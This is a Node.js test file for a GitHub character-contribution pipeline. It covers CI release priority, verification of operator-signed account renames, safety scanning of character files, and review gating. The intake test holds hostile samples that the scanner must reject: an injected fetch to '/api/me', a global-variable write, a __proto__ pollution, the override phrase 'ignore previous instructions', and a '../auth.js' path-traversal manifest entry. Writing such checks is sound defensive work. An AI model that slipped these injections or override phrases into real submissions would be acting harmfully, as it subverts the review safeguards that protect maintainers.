// Eligibility and identity reconciliation are authorization boundaries. No live network.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readdirSync, readFileSync } from "node:fs";
import { runInNewContext } from "node:vm";
import { contributorRows, createContributorLookup, createOwnedCharacterLookup } from "../src/contributor-policy.js";
import { missingCharacters, characterSource, retiredCharacters, queuedDefaults } from "../../scripts/sync-characters.mjs";
import { checkCharacterIdentities, identityAdvice } from "../../scripts/contributor-pr.mjs";
import { declaredIdentity, mayAuthorIdentity } from "../../scripts/character-identity.mjs";
import { CharacterRejection, parseSafeCharacter, scanCharacter, screenFinding, safeCharacterSource, checkOwner, isGitHubDisplayRename } from "../../scripts/character-safety.mjs";
import { LANES, digest, due, inspectSubmission, manifestPath, readManifest, queuedCharacters, reviewDecision } from "../../scripts/character-submissions.mjs";
import { createCoordinator, runAccountRenameChecks } from "../../scripts/character-bundles.mjs";
import { BOT, OPERATORS, isOperator } from "../../scripts/character-operators.mjs";
import { inspectAccountRename, onlyAccountLoginChanged } from "../../scripts/character-account-rename.mjs";
import { createGitHub } from "../../scripts/character-github.mjs";
import { snapshotRename, refreshRenameSnapshot } from "../../scripts/account-rename-snapshot.mjs";
import { OVERRIDE_VERIFIED, overridePaths } from "../../scripts/character-override.mjs";
import { createPriority, isRelease, DEFER_STEP, UNIT_STATUS } from "../../scripts/ci-priority.mjs";

const NOW = Date.parse("2026-10-04T12:00:00Z");
const person = (login, extra = {}) => ({ login, counts: { commits: 1 }, first_seen_at: "2026-09-01T00:00:00Z", last_seen_at: "2026-10-04T11:00:00Z", ...extra });
const snapshot = (...rows) => ({ meta: { org: "OogaBoogaX", schema_version: 3, generated_at: new Date(NOW).toISOString() }, contributors: rows });

test("release priority yields before work and resumes only deferred checks for current PR revisions", async (t) => {
  const fixture = () => {
    const f = { runs: [], prs: [], jobs: new Map(), writes: [], statuses: [] };
    f.add = (id, workflow = "tests.yml", event = "pull_request") => {
      const run = { id, path: `.github/workflows/${workflow}`, event, head_branch: `feature/${id}`, head_sha: String(id).padStart(40, "0"),
        status: "completed", conclusion: "failure", run_attempt: 1, created_at: new Date(NOW).toISOString() };
      f.runs.push(run);
      f.prs.push({ number: id, state: "open", draft: false, base: { ref: "rock" }, head: { sha: run.head_sha, ref: run.head_branch } });
      f.jobs.set(id, [{ id: id * 100, name: UNIT_STATUS, conclusion: "failure", steps: [
        { name: "Inspect release priority", conclusion: "success" }, { name: DEFER_STEP, conclusion: "failure" }
      ] }]);
      return run;
    };
    f.release = () => { const run = { id: 999, path: ".github/workflows/pages.yml", head_branch: "rock", event: "push", status: "pending" }; f.runs.push(run); return run; };
    f.api = async (path, method = "GET", data) => {
      const url = new URL(path, "https://example.invalid/"), p = url.pathname.slice(1), q = url.searchParams;
      if (method === "POST") {
        if (p.startsWith("statuses/")) { f.statuses.unshift({ ...data, creator: { login: "github-actions[bot]" } }); return null; }
        assert.match(p, /^actions\/jobs\/\d+\/rerun$/);
        f.writes.push(p);
        const run = f.runs.find((row) => row.id * 100 === Number(p.split("/")[2]));
        run.status = "queued"; run.run_attempt++;
        return null;
      }
      if (p.startsWith("commits/") && p.endsWith("/statuses")) return structuredClone(f.statuses);
      if (p === "pulls") return structuredClone(f.prs);
      if (p.startsWith("pulls/")) return structuredClone(f.prs.find((pr) => pr.number === Number(p.split("/")[1])));
      if (p.endsWith("/jobs")) {
        const jobs = f.jobs.get(Number(p.split("/")[2])); return { total_count: jobs.length, jobs };
      }
      if (/^actions\/runs\/\d+$/.test(p)) return structuredClone(f.runs.find((row) => row.id === Number(p.split("/")[2])));
      if (p === "actions/runs" || p.startsWith("actions/workflows/")) {
        const rows = f.runs.filter((row) => {
          if (p.startsWith("actions/workflows/") && row.path !== `.github/workflows/${p.split("/")[2]}`) return false;
          if (q.has("branch") && row.head_branch !== q.get("branch")) return false;
          for (const key of ["status", "head_sha", "event"]) if (q.has(key) && (key === "status" && q.get(key) === "failure" ? row.conclusion : row[key]) !== q.get(key)) return false;
          return true;
        });
        return { total_count: rows.length, workflow_runs: structuredClone(rows.sort((a, b) => b.id - a.id).slice(0, Number(q.get("per_page")) || 100)) };
      }
      throw new Error(`Unexpected priority request ${method} ${path}`);
    };
    f.priority = createPriority((...args) => f.api(...args), () => NOW);
    return f;
  };
  await t.test("only real release workflow paths and events get priority, including waiting deployments", async () => {
    for (const [path, branch, event] of [["pages.yml", "rock", "push"], ["pages.yml", "rock", "workflow_dispatch"],
      ["cloudflare-staging.yml", "feature/staging", "workflow_dispatch"], ["cloudflare-production.yml", "rock", "workflow_dispatch"]]) {
      for (const status of ["pending", "queued", "in_progress", "waiting", "requested"]) assert.ok(isRelease({ path: `.github/workflows/${path}`, head_branch: branch, event, status }));
      assert.ok(!isRelease({ path: `.github/workflows/${path}`, head_branch: branch, event, status: "completed" }));
    }
    assert.ok(!isRelease({ path: ".github/workflows/pages.yml", event: "pull_request", head_branch: "rock", status: "queued" }));
    assert.ok(!isRelease({ path: ".github/workflows/cloudflare-production.yml", event: "workflow_dispatch", head_branch: "feature/x", status: "queued" }));
    const f = fixture(); f.add(1); f.release();
    assert.equal((await f.priority.releases()).length, 1);
    assert.equal(await f.priority.resume(), 0);
    assert.deepEqual(f.writes, []);
  });
  await t.test("resume the yielded job once, preserving successful jobs and rejecting actual failures", async () => {
    const f = fixture(); f.add(1); f.add(2);
    f.jobs.get(1).unshift({ id: 101, conclusion: "success", steps: [] });
    f.jobs.get(2)[0].steps = [{ name: "Run the unit lane", conclusion: "failure" }];
    assert.equal(await f.priority.resume(), 1);
    assert.deepEqual(f.writes, ["actions/jobs/100/rerun"]);
    assert.equal(await f.priority.resume(), 0);
    // An imitated gate that fails on every attempt cannot consume runners on
    // every scheduled recovery pass. Manual attempts count toward the cap too.
    for (let attempt = 2; attempt <= 4; attempt++) {
      f.runs[0].status = "completed";
      assert.equal(f.runs[0].run_attempt, attempt);
      assert.equal(await f.priority.resume(), attempt < 4 ? 1 : 0);
    }
    assert.equal(f.writes.length, 3);
    assert.equal(await f.priority.resume(), 0, "later recovery passes preserve the exhausted limit");
    for (const attempt of [undefined, 0, -1, 1.5]) {
      f.runs[0].run_attempt = attempt;
      assert.equal(await f.priority.resume(), 0, "invalid attempt metadata cannot reset the limit");
    }
  });
  await t.test("stale heads, drafts, closed PRs and newer runs never resurrect old checks", async () => {
    for (const condition of ["head", "draft", "closed", "newer"]) {
      const f = fixture(), run = f.add(1);
      if (condition === "head") f.prs[0].head.sha = "f".repeat(40);
      if (condition === "draft") f.prs[0].draft = true;
      if (condition === "closed") f.prs = [];
      if (condition === "newer") { f.runs.push({ ...run, id: 2, conclusion: "success" }); f.jobs.set(2, [{ id: 200, conclusion: "success", steps: [] }]); }
      assert.equal(await f.priority.resume(), 0, condition);
      assert.deepEqual(f.writes, []);
    }
  });
  await t.test("head and run-attempt races are rechecked, and another release stops resumption", async () => {
    for (const moving of ["head", "attempt", "release"]) {
      const f = fixture(); f.add(1);
      const api = f.api;
      f.api = async (path, ...args) => {
        if (path.includes("/jobs?")) {
          if (moving === "head") f.prs[0].head.sha = "f".repeat(40);
          if (moving === "attempt") f.runs[0].run_attempt++;
          if (moving === "release") f.release();
        }
        return api(path, ...args);
      };
      assert.equal(await f.priority.resume(), 0, moving);
      assert.deepEqual(f.writes, []);
    }
  });
  await t.test("deferred character inspection, writers and recovery sweeps resume through their original jobs", async () => {
    const f = fixture();
    f.add(1, "character-bundles.yml", "pull_request_target");
    f.add(2, "character-bundles.yml", "schedule");
    f.add(3, "character-bundles.yml", "workflow_run");
    f.add(4, "character-bundles.yml", "workflow_dispatch");
    assert.equal(await f.priority.resume(), 3);
    assert.deepEqual(f.writes, ["actions/jobs/100/rerun", "actions/jobs/200/rerun", "actions/jobs/300/rerun"]);
  });
  await t.test("successful deferrals stay pending, resume without repeating completed work, and legacy failures still recover", async () => {
    const f = fixture(), run = f.add(1), job = f.jobs.get(1)[0];
    run.conclusion = job.conclusion = job.steps[1].conclusion = "success";
    assert.equal(await f.priority.report(1, "example/land"), true);
    assert.equal(f.statuses[0].state, "pending");
    assert.match(f.statuses[0].description, /Deferred/);
    assert.equal(await f.priority.pendingUnit(1, 1, run.head_sha, "example/land"), true);
    assert.equal(await f.priority.resume(), 1);
    assert.deepEqual(f.writes, ["actions/jobs/100/rerun"]);
    assert.equal(await f.priority.pendingUnit(1, 2, run.head_sha, "example/land"), false, "old pending status cannot admit a new attempt");
    f.add(2);
    assert.equal(await f.priority.resume(), 1, "old failing deferrals remain recoverable during rollout");
  });
  await t.test("only complete validation passes the required status; genuine failures, cancelled or skipped tests block", async () => {
    for (const condition of ["passed", "failed", "skipped", "cancelled", "running", "missing", "forged-source"]) {
      const f = fixture(), run = f.add(1), job = f.jobs.get(1)[0];
      run.conclusion = job.conclusion = "success";
      job.steps = ["Run the unit lane", "Build and stage site", "Install Worker dependencies", "Worker checks"].map(name => ({ name, conclusion: "success" }));
      if (condition === "failed") { run.conclusion = job.conclusion = "failure"; job.steps[3].conclusion = "failure"; }
      if (condition === "skipped") job.steps[3].conclusion = "skipped";
      if (condition === "cancelled") run.conclusion = job.conclusion = "cancelled";
      if (condition === "running") { run.status = "in_progress"; run.conclusion = null; }
      if (condition === "missing") f.jobs.set(1, []);
      if (condition === "forged-source") run.path = ".github/workflows/not-tests.yml";
      await f.priority.report(1, "example/land");
      if (condition === "forged-source") assert.deepEqual(f.statuses, []);
      else assert.equal(f.statuses[0].state, condition === "passed" ? "success" : condition === "running" ? "pending" : "failure", condition);
      if (condition === "passed") assert.equal(await f.priority.resume(), 0, "completed validation is not a deferral");
    }
  });
  await t.test("pending status must belong to the trusted reporter and exact run attempt; stale reports do not overwrite current heads", async () => {
    const f = fixture(), run = f.add(1);
    assert.equal(await f.priority.pendingUnit(1, 1, run.head_sha, "example/land"), false);
    await f.priority.report(1, "example/land");
    f.statuses[0].creator.login = "someone-else";
    assert.equal(await f.priority.pendingUnit(1, 1, run.head_sha, "example/land"), false);
    f.statuses[0].creator.login = "github-actions[bot]";
    f.statuses[0].state = "success";
    assert.equal(await f.priority.pendingUnit(1, 1, run.head_sha, "example/land"), false);
    for (const condition of ["head", "closed", "newer", "attempt-race", "status-race"]) {
      const f = fixture(), run = f.add(1);
      if (condition === "head") f.prs[0].head.sha = "f".repeat(40);
      if (condition === "closed") f.prs = [];
      if (condition === "newer") f.runs.push({ ...run, id: 2 });
      if (condition === "attempt-race") { const api = f.api; f.api = async (...args) => { if (args[0].includes("/jobs?")) run.run_attempt++; return api(...args); }; }
      if (condition === "status-race") f.statuses.push({ context: UNIT_STATUS, state: "pending", creator: { login: "github-actions[bot]" }, target_url: "https://github.com/example/land/actions/runs/2/attempts/1" });
      const before = structuredClone(f.statuses);
      assert.equal(await f.priority.report(1, "example/land"), false, condition);
      assert.deepEqual(f.statuses, before);
    }
  });
  await t.test("recovery reads current heads instead of thousands of historical successes, and rejects expired runs", async () => {
    const f = fixture(), run = f.add(1);
    for (let id = 2; id < 1200; id++) f.runs.push({ ...run, id, head_sha: String(id).padStart(40, "0"), head_branch: `old/${id}`, conclusion: "success" });
    assert.equal(await f.priority.resume(), 1);
    run.status = "completed"; run.created_at = new Date(NOW - 31 * 86400000).toISOString();
    assert.equal(await f.priority.resume(), 0);
  });
  await t.test("scheduled reporting repairs missed events without repeating identical statuses", async () => {
    const f = fixture(); f.add(1);
    assert.equal(await f.priority.reportCurrent("example/land"), 1);
    assert.equal(f.statuses.length, 1);
    assert.equal(f.statuses[0].state, "pending");
    assert.equal(await f.priority.reportCurrent("example/land"), 1);
    assert.equal(f.statuses.length, 1);
  });
  await t.test("unavailable or truncated metadata cannot admit work or launch recovery", async () => {
    for (const api of [async () => { throw new Error("Unavailable"); }, async () => ({ workflow_runs: [], total_count: 1001 }), async () => ({})]) {
      const priority = createPriority(api);
      await assert.rejects(priority.releases());
      await assert.rejects(priority.resume());
    }
  });
});

const accountRenameFixture = () => {
  const rock = "a".repeat(40), head = "b".repeat(40), path = "src/characters/Bitcoin-Bill.js", repo = "example/land";
  // Historical fixture: the deployed character can already have its new login.
  const base = `BL.characters.add({
    handle: "Bitcoin-Bill",
    github: "Bitcoin-Bill",
    display: "Bitclank Bill",
    joined: 1,
    lastCommit: 2
  });\n`;
  const f = { rock, head, path, repo, base, source: base.replace('github: "Bitcoin-Bill"', 'github: "Bitclank-Bill"'),
    permission: "admin", commits: [{ sha: head }], reviews: [], calls: [], signed: true,
    account: { id: 185141343, login: "Bitclank-Bill", type: "User" }, revisionFiles: [{ filename: path, status: "modified" }] };
  f.pr = { number: 7, state: "open", draft: false, user: { ...OPERATORS[0], type: "User" }, base: { ref: "rock", repo: { full_name: repo } }, head: { sha: head, repo: { full_name: repo } } };
  f.gh = { repo,
    api: async (url, method, data) => {
      f.calls.push({ url, method, data });
      if (url === "pulls/7") return f.pr;
      if (url === "git/ref/heads/rock") return { object: { sha: rock } };
      if (url.startsWith("statuses/")) return {};
      if (url.startsWith("collaborators/")) return { permission: f.permission };
      if (url.startsWith("compare/")) return { merge_base_commit: { sha: rock }, total_commits: f.commits.length, files: f.diffFiles || [{ filename: path, status: "modified" }] };
      if (url.startsWith("commits/")) return { author: f.revisionAuthor || f.pr.user, parents: [{ sha: rock }], files: f.revisionFiles, commit: { verification: { verified: f.signed } } };
      throw new Error(`Unexpected request ${url}`);
    },
    list: async (url) => {
      if (url === "pulls/7/commits") return f.commits;
      if (url === "pulls/7/reviews") return f.reviews;
      if (url === "pulls?state=open&base=rock") return [f.pr];
      throw new Error(`Unexpected list ${url}`);
    },
    tree: async () => new Map([[path, {}]]),
    file: async (ref) => ({ sha: ref === rock ? "c".repeat(40) : "d".repeat(40), source: ref === rock ? f.base : ref === head ? f.source : f.earlierSource }),
    account: async (lookup) => f.lookup ? f.lookup(lookup) : f.account
  };
  return f;
};

test("rename unit preparation refreshes only a pinned github-only change and fails closed on missing or stale activity", async () => {
  const f = accountRenameFixture();
  const detect = (files = [f.path], before = f.base, after = f.source) => snapshotRename(files, () => before, () => after);
  assert.equal(detect(), "Bitclank-Bill");
  assert.equal(detect([f.path, "README.md"]), null);
  assert.equal(detect([f.path], null), null);
  assert.equal(detect([f.path], f.base, null), null);
  assert.equal(detect([f.path], f.base, f.base), null);
  assert.equal(detect([f.path], f.base, f.source + "\n// unrelated"), null);
  assert.equal(detect(["src/characters/Alice.js"], f.base.replaceAll("Bitcoin-Bill", "Alice"), f.source.replaceAll("Bitcoin-Bill", "Alice")), null);
  let calls = 0, baked;
  const bake = async (stats) => { baked = stats; };
  const fetcher = (stats) => async () => { calls++; return new Response(JSON.stringify(stats)); };
  assert.equal(await refreshRenameSnapshot(null, bake, () => { throw new Error("unexpected fetch"); }, NOW), false);
  const current = snapshot(person("Bitclank-Bill"));
  assert.equal(await refreshRenameSnapshot(detect(), bake, fetcher(current), NOW), true);
  assert.deepEqual(baked, current);
  baked = null;
  await assert.rejects(refreshRenameSnapshot(detect(), bake, fetcher(snapshot(person("Bitcoin-Bill"))), NOW), /does not contain/);
  await assert.rejects(refreshRenameSnapshot(detect(), bake, fetcher(current), NOW + 86400001), /stale/);
  await assert.rejects(refreshRenameSnapshot(detect(), bake, async () => new Response("denied", { status: 403 }), NOW), /403/);
  await assert.rejects(refreshRenameSnapshot(detect(), bake, async () => { throw new Error("offline"); }, NOW), /offline/);
  assert.equal(baked, null);
  await assert.rejects(refreshRenameSnapshot(detect(), async () => { throw new Error("bake failed"); }, fetcher(current), NOW), /bake failed/);
  assert.equal(calls, 4);
});

test("same-ID account rename accepts only a verified github-only signed operator PR", async () => {
  const f = accountRenameFixture(), inspect = () => inspectAccountRename(f.gh, f.pr, f.rock);
  assert.equal(onlyAccountLoginChanged(f.base, f.source), true);
  assert.equal((await inspect()).githubId, 185141343);
  assert.equal((await inspect()).newLogin, "Bitclank-Bill");
  f.account.login = "Bitcoin-Bill";
  await assert.rejects(inspect, /not verified/);
  f.account.login = "Bitclank-Bill";
  f.lookup = async (key) => ({ ...f.account, id: typeof key === "number" ? 185141343 : 123 });
  await assert.rejects(inspect, /not verified/);
  f.lookup = async () => { throw new Error("GitHub unavailable"); };
  await assert.rejects(inspect, /unavailable/);
  f.lookup = null; f.account.type = "Bot";
  await assert.rejects(inspect, /not verified/);
  f.account.type = "User"; f.pr.user.id = 123;
  await assert.rejects(inspect, /operator-authored/);
  f.pr.user = { ...OPERATORS[0], type: "User" }; f.permission = "write";
  await assert.rejects(inspect, /Maintain\/Admin/);
  f.permission = "admin"; f.signed = false;
  await assert.rejects(inspect, /signed operator/);
  f.signed = true; f.pr.head.repo.full_name = "someone/fork";
  await assert.rejects(inspect, /in this repository/);
});

test("same-ID account rename rejects mixed diffs, reverted code changes and stale PR heads", async () => {
  const f = accountRenameFixture(), inspect = () => inspectAccountRename(f.gh, f.pr, f.rock);
  const valid = f.source;
  f.source += "\n// unrelated edit\n";
  await assert.rejects(inspect, /only.*github line/);
  f.source = valid; f.diffFiles = [...f.revisionFiles, { filename: "README.md", status: "modified" }];
  await assert.rejects(inspect, /only.*github line/);
  f.diffFiles = null; f.revisionFiles.push({ filename: "worker/src/auth.js", status: "modified" });
  await assert.rejects(inspect, /signed operator/);
  f.revisionFiles.pop(); f.commits.unshift({ sha: "e".repeat(40) }); f.earlierSource = valid + "\n// reverted edit\n";
  await assert.rejects(inspect, /history contains another change/);
  f.commits.shift();
  f.lookup = async () => { f.pr = { ...f.pr, head: { ...f.pr.head, sha: "f".repeat(40) } }; return f.account; };
  await assert.rejects(inspect, /changed during verification/);
  assert.throws(() => checkOwner({ handle: "Bitcoin-Bill", github: "Bitclank-Bill" },
    { handle: "Bitcoin-Bill", github: "Bitcoin-Bill" }, OPERATORS[0].login, true), /separate maintainer-reviewed PR/);
});

test("verified account-rename checks pass without a second operator's approval and perform no bundle or merge writes", async () => {
  const f = accountRenameFixture(), coordinator = createCoordinator(f.gh, "private-app[bot]");
  const gate = () => f.calls.filter((call) => call.data?.context === "Character bundle safety").at(-1)?.data.state;
  assert.equal(await runAccountRenameChecks(coordinator, { action: "synchronize", pull_request: { number: 7 } }), true);
  assert.equal(gate(), "success");
  await runAccountRenameChecks(coordinator, { workflow_run: { event: "pull_request_review" } }); assert.equal(gate(), "success");
  await runAccountRenameChecks(coordinator, { schedule: "17,37,57 * * * *" }); assert.equal(gate(), "success");
  f.account.id = 123;
  await assert.rejects(() => coordinator.accountRename(7), /not verified/);
  assert.equal(gate(), "failure");
  f.account.id = 185141343; f.pr.user = { ...f.pr.user, login: "former-operator" };
  await assert.rejects(() => coordinator.refreshAccountRenames(), /operator-authored/);
  assert.equal(gate(), "failure");
  f.pr.user = { ...OPERATORS[0], type: "User" };
  assert.ok(f.calls.filter((call) => call.method && call.method !== "GET").every((call) => call.url.startsWith("statuses/")));
  const before = f.calls.filter((call) => call.method === "POST").length;
  f.account.id = 185141343; f.source = f.base.replace('display: "Bitclank Bill"', 'display: "Different display"');
  assert.equal(await coordinator.accountRename(7), false);
  assert.equal(f.calls.filter((call) => call.method === "POST").length, before);
});

test("rename refresh failures leave unidentified PR statuses untouched but identified renames fail closed", async () => {
  for (const scenario of ["timeout", "5xx", "truncated", "file", "declaration"]) {
    const f = accountRenameFixture(), api = f.gh.api, file = f.gh.file;
    // An ordinary code PR or bot bundle must keep its required statuses, even
    // when discovery fails before the refresh can tell which kind of PR it is.
    f.diffFiles = [{ filename: "README.md", status: "modified" }];
    if (scenario === "5xx") f.pr.user = { login: "private-app[bot]", type: "Bot" };
    f.gh.api = async (url, ...rest) => {
      if (url.startsWith("compare/")) {
        if (scenario === "timeout" || scenario === "5xx") throw new Error(`GitHub ${scenario}`);
        if (scenario === "truncated") return { merge_base_commit: { sha: f.rock }, files: Array(300).fill(f.diffFiles[0]) };
      }
      return api(url, ...rest);
    };
    if (scenario === "file" || scenario === "declaration") {
      f.diffFiles = null; f.source = f.base;
      f.gh.file = async (...args) => {
        if (scenario === "file") throw new Error("GitHub blob unavailable");
        return { ...await file(...args), source: "/* incomplete declaration" };
      };
    }
    const coordinator = createCoordinator(f.gh, "private-app[bot]");
    await assert.rejects(() => runAccountRenameChecks(coordinator, { schedule: "17,37,57 * * * *" }));
    assert.equal(f.calls.filter((call) => call.method === "POST").length, 0, scenario);
    f.gh.api = api; f.gh.file = file;
    if (scenario === "file" || scenario === "declaration") f.source = f.base;
    await coordinator.refreshAccountRenames();
    assert.equal(f.calls.filter((call) => call.method === "POST").length, 0, `${scenario} recovery`);
  }
  const f = accountRenameFixture(), coordinator = createCoordinator(f.gh, "private-app[bot]");
  f.lookup = async () => { throw new Error("GitHub unavailable after owner change identified"); };
  await assert.rejects(() => coordinator.refreshAccountRenames(), /unavailable/);
  assert.deepEqual(f.calls.filter((call) => call.method === "POST").map((call) => [call.data.context, call.data.state]),
    [["Character intake", "failure"], ["Character bundle safety", "failure"]]);
  f.lookup = null;
  await coordinator.refreshAccountRenames();
  assert.deepEqual(f.calls.filter((call) => call.method === "POST").slice(-2).map((call) => call.data.state), ["success", "success"]);
});

test("account lookup uses GitHub's ID and login endpoints without following supplied URLs", async () => {
  const calls = [], gh = createGitHub("example/land", "test-token", async (url, init) => {
    calls.push({ url, method: init.method }); return { ok: true, status: 200, json: async () => ({ id: 185141343 }) };
  });
  await gh.account(185141343); await gh.account("Bitclank-Bill");
  assert.deepEqual(calls, [{ url: "https://api.github.com/user/185141343", method: "GET" }, { url: "https://api.github.com/users/Bitclank-Bill", method: "GET" }]);
});

test("verified account rename refuses competing queued work and another character's login", async () => {
  const f = accountRenameFixture(), bot = "private-app[bot]", queueHead = "d".repeat(40);
  const bundle = { number: 9, state: "open", user: { login: bot }, base: { ref: "rock", repo: { full_name: f.repo } },
    head: { sha: queueHead, ref: "automation/characters-manual-test", repo: { full_name: f.repo } } };
  const api = f.gh.api, list = f.gh.list, file = f.gh.file;
  f.gh.api = async (url, ...rest) => url === "pulls/9" ? bundle
    : url === `commits/${queueHead}` ? { author: { login: bot }, commit: { verification: { verified: true } } } : api(url, ...rest);
  f.gh.list = async (url) => url === "pulls?state=open&base=rock" ? [f.pr, bundle] : list(url);
  f.gh.file = async (ref, path) => ref === queueHead ? { sha: queueHead, source: path === manifestPath("manual")
    ? JSON.stringify({ version: 1, lane: "manual", openedOn: "2026-11-04", entries: [{ path: f.path, pr: 5, head: "e".repeat(40),
      base: "c".repeat(40), hash: digest(f.base), author: "owner", lane: "manual" }] }) : f.base } : file(ref, path);
  const coordinator = createCoordinator(f.gh, bot);
  await assert.rejects(() => coordinator.accountRename(7), /competing queued/);
  f.gh.list = list; f.gh.file = async (ref, path) => path === "src/characters/other.js"
    ? { source: 'BL.characters.add({handle:"other",github:"Bitclank-Bill"});' } : file(ref, path);
  f.gh.tree = async () => new Map([[f.path, {}], ["src/characters/other.js", {}]]);
  await assert.rejects(() => coordinator.accountRename(7), /different character file/);
  assert.ok(f.calls.filter((call) => call.method && call.method !== "GET").every((call) => call.url.startsWith("statuses/")));
});

test("daily character intake accepts only bounded data and never executes source", () => {
  const source = characterSource({ handle: "owner", joined: 1, lastCommit: 2 });
  const accepted = scanCharacter(source);
  assert.equal(accepted.lane, "daily");
  assert.equal(parseSafeCharacter(accepted.source).handle, "owner");
  assert.equal(declaredIdentity(accepted.source).handle, "owner");
  for (const malicious of [source + 'fetch("/api/me");', source.replace('handle: "owner"', 'handle: "owner", __proto__: {}'),
    source.replace('handle: "owner"', 'handle: "owner", handle: "other"'),
    source.replace('handle: "owner"', 'handle: `owner`'), source + '// ignore previous instructions',
    source + 'globalThis.stolen = true;', source.replace('handle: "owner"', 'handle: "owner", look: { height: 1e200 }')]) {
    assert.throws(() => parseSafeCharacter(malicious), CharacterRejection);
  }
  for (const dangerous of [source + 'fetch("/api/me");', source + '// ignore previous instructions', source + 'globalThis.stolen = true;']) assert.throws(() => scanCharacter(dangerous), CharacterRejection);
  const custom = source.replace('lastCommit: 2', 'lastCommit: 2, dress: { crown(k, v) { v.set(0, 0, 0, k.P.black); } }');
  assert.equal(scanCharacter(custom).lane, "manual");
  assert.equal(globalThis.stolen, undefined);
  // Every face the body draws is plain data, and a file sent to manual review says why, naming a field only when
  // its name is a plain word: the finding is posted on the PR.
  const looked = (look) => scanCharacter(source.replace('lastCommit: 2', `lastCommit: 2, look: ${look}`));
  for (const face of ["none", "nose", "beard", "smirk"]) assert.equal(looked(`{ face: "${face}" }`).lane, "daily");
  assert.equal(scanCharacter(source).why, undefined);
  assert.match(scanCharacter(custom).why, /executable code is not eligible/);
  assert.match(looked('{ height: 2 }').why, /`height` exceeds its safe range, 0\.8 to 1\.3/);
  assert.match(looked('{ tail: true }').why, /Unknown appearance field `tail`/);
  assert.match(looked('{ "@everyone [x](y)": true }').why, /Unknown appearance field an unnamed field/);
  assert.deepEqual(screenFinding('const a = 1;\n// a function here\n'), { line: 2, text: "function" });
  assert.equal(screenFinding(source), null);
  assert.throws(() => safeCharacterSource({ handle: "owner", joined: 1, lastCommit: 2, voice: { poke: "hi", idle: [] } }), CharacterRejection);
});

test("appearance edits need the owner too, aliases preserve ownership and identity transfers stay manual", () => {
  const previous = { handle: "cave-name", github: "owner" };
  assert.throws(() => checkOwner({ ...previous }, previous, "attacker"), CharacterRejection);
  assert.equal(checkOwner({ ...previous }, previous, "owner").github, "owner");
  assert.equal(checkOwner({ handle: "alias" }, null, "owner").github, "owner");
  assert.equal(checkOwner({ ...previous }, previous, "maintainer", true).github, "owner");
  assert.throws(() => checkOwner({ handle: "cave-name", github: "other" }, previous, "maintainer", true), CharacterRejection);
});

test("midnight gates are UTC, never merge empty or manual bundles, and reused bundles wait for their new day", () => {
  const state = { lane: "daily", openedOn: "2026-10-04", entries: [{}] };
  assert.equal(due(state, new Date("2026-10-04T23:59:59Z")), false);
  assert.equal(due(state, new Date("2026-10-05T00:00:00Z")), true);
  assert.equal(due({ ...state, entries: [] }, new Date("2026-10-05T00:30:00Z")), false);
  assert.equal(due({ ...state, lane: "manual" }, new Date("2026-10-05T00:30:00Z")), false);
  assert.equal(due({ ...state, lane: "rename" }, new Date("2026-10-05T00:30:00Z")), false);
  assert.equal(due({ ...state, openedOn: "2026-10-05" }, new Date("2026-10-05T00:30:00Z")), false);
  assert.throws(() => readManifest(JSON.stringify({ version: 1, lane: "daily", openedOn: "2026-10-04", entries: [{ path: "../auth.js" }] }), "daily"));
});

test("empty bundle identity checks pass only for validated placeholders and still reject reconciliation", async (t) => {
  const repo = "example/land", bot = "private-app[bot]", rock = "a".repeat(40), head = "b".repeat(40), blob = "c".repeat(40);
  const saved = Object.fromEntries(["GITHUB_REPOSITORY", "GITHUB_TOKEN", "CHARACTER_BOT_LOGIN"].map((key) => [key, process.env[key]]));
  Object.assign(process.env, { GITHUB_REPOSITORY: repo, GITHUB_TOKEN: "test-token", CHARACTER_BOT_LOGIN: bot });
  t.after(() => { for (const [key, value] of Object.entries(saved)) { if (value === undefined) delete process.env[key]; else process.env[key] = value; } });
  let lane = "daily", verified = true, unexpected = false;
  t.mock.method(globalThis, "fetch", async (url) => {
    const path = url.slice(`https://api.github.com/repos/${repo}/`.length);
    const source = JSON.stringify({ version: 1, lane, openedOn: "2026-10-04", entries: [] });
    let data;
    if (path === "git/ref/heads/rock") data = { object: { sha: rock } };
    else if (path === "commits/merged") data = { parents: [{ sha: rock }] };
    else if (path === `git/trees/${head}?recursive=1`) data = { tree: [{ path: manifestPath(lane), type: "blob", mode: "100644", sha: blob, size: source.length }] };
    else if (path === `git/blobs/${blob}`) data = { encoding: "base64", size: source.length, content: Buffer.from(source).toString("base64") };
    else if (path === `commits/${head}`) data = { author: { login: bot }, commit: { verification: { verified } } };
    else if (path === `compare/${rock}...${head}`) data = { files: [{ filename: unexpected ? "worker/src/auth.js" : manifestPath(lane), status: "added" }] };
    else if (path === `git/trees/${rock}?recursive=1`) data = { tree: [] };
    else throw new Error(`Unexpected request: ${path}`);
    return new Response(JSON.stringify(data));
  });
  for (lane of LANES) {
    const pr = { user: { login: bot }, head: { sha: head, ref: `automation/characters-${lane}-abc`, repo: { full_name: repo } },
      base: { ref: "rock", repo: { full_name: repo } }, merge_commit_sha: "merged" };
    assert.deepEqual(await checkCharacterIdentities(pr), []);
    await assert.rejects(checkCharacterIdentities(pr, true), /Empty character bundle/);
    verified = false;
    await assert.rejects(checkCharacterIdentities(pr), /not a verified commit/);
    verified = true;
    unexpected = true;
    await assert.rejects(checkCharacterIdentities(pr), /unexpected files/);
    unexpected = false;
  }
});

test("manual bundles require current-head operator approval and respect dismissal or requested changes", async () => {
  const pr = { number: 1, user: { login: "app[bot]" }, head: { sha: "current" } };
  const operator = { ...OPERATORS[0], type: "User" };
  let reviews = [{ user: operator, state: "APPROVED", commit_id: "old" }];
  const gh = { list: async () => reviews, api: async () => ({ role_name: "maintain" }) };
  assert.equal((await reviewDecision(gh, pr)).approved, false);
  reviews[0].commit_id = "current";
  assert.equal((await reviewDecision(gh, pr)).approved, true);
  reviews.push({ user: operator, state: "DISMISSED", commit_id: "current" });
  assert.equal((await reviewDecision(gh, pr)).approved, false);
  reviews = [{ user: { login: "writer" }, state: "APPROVED", commit_id: "current" }];
  assert.equal((await reviewDecision(gh, pr)).approved, false);
  reviews.push({ user: operator, state: "CHANGES_REQUESTED", commit_id: "current" });
  assert.equal((await reviewDecision(gh, pr)).changesRequested, true);
  for (const user of OPERATORS) assert.equal(isOperator({ ...user, type: "User" }), true);
  assert.equal(isOperator({ ...operator, id: 1 }), false);
  assert.equal(isOperator({ ...operator, type: "Bot" }), false);
  reviews = [{ user: { ...operator, id: 1 }, state: "APPROVED", commit_id: "current" }];
  assert.equal((await reviewDecision(gh, pr)).approved, false);
});

